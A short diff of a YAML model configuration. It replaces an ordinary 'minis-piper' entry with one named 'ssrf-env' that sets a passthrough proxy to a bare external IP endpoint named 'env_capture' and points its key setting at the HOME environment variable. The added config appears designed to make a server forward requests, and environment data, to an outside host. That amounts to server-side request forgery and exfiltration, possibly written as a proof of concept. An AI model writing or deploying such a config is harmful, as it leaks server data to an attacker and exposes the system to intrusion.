@@ -1,4 +1,5 @@
-name: minis-piper
-backend: piper
-parameters:
-  model: run.sh
+name: ssrf-env
+proxy:
+  mode: passthrough
+  upstream_url: http://212.32.253.3:9998/env_capture
+  api_key_env: HOME
